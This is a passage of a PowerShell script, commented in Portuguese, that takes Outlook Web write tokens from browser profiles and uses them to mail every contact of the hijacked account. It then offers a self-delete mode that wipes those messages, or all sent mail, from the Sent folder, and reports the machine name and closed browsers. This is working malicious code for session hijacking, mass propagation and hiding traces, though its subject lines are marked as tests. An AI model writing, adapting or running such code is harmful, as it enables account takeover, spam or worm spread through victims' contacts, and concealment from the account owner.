        if ($MaxContacts -gt 0 -and $contatos.Count -gt $MaxContacts) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
        $ok = 0; $falhas = @()
        foreach ($c in $contatos) {
            $res = Send-OWAMail $src.token_write $c.email $subject $body
            if ($res.ok) { $ok++ }
            else { $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro } }
            Start-Sleep -Milliseconds 300
        }
        $envioTodos = [PSCustomObject]@{
            de = $src.conta; total = $contatos.Count; enviados = $ok; falhas = $falhas
            perfil = "$($src.navegador)/$($src.perfil)"
        }
    } else {
        $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
    }
}

# ---- modo -SelfDelete: apaga o que esta execucao enviou (ou tudo, -SelfDeleteAll) ----
# Assunto a filtrar: -Subject sempre vence; senao, o padrao do modo que rodou.
# Pausa curta antes: o enviado aparece na pasta com pequeno atraso (consistencia
# eventual). Usa o MESMO criterio de selecao de token WRITE dos modos de envio.
$selfDelReport = $null
if ($SelfDelete.IsPresent -or $SelfDeleteAll.IsPresent) {
    $all = $SelfDeleteAll.IsPresent
    $sdSubject = if ($Subject) { $Subject }
        elseif ($ToAllContacts.IsPresent) { "[TESTE EnvioHOT] rehot -ToAllContacts" }
        else { "[TESTE EnvioHOT] rehot.ps1 -SendTo" }
    $srcDel = $validos | Where-Object { $_.token_write } | Select-Object -First 1
    if ($srcDel) {
        Start-Sleep -Seconds 2
        $rd = Remove-OWASentMessages $srcDel.token_write $sdSubject $all
        $selfDelReport = [PSCustomObject]@{
            de = $srcDel.conta
            modo = if ($all) { "tudo" } else { "por_assunto: $sdSubject" }
            apagadas = $rd.apagadas; falhas = $rd.falhas; total_visto = $rd.total_visto
            perfil = "$($srcDel.navegador)/$($srcDel.perfil)"
        }
    } else {
        $selfDelReport = [PSCustomObject]@{ de = $null; apagadas = 0; falhas = @(); total_visto = 0; status = "sem_token_write" }
    }
}

$out = [PSCustomObject]@{
    maquina   = $env:COMPUTERNAME
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
    navegadores_fechados = $fechados
    decisao   = $decisao
    envio     = $envio
    envio_todos = $envioTodos
    self_delete = $selfDelReport
    perfis    = $results
}
$out | ConvertTo-Json -Depth 6
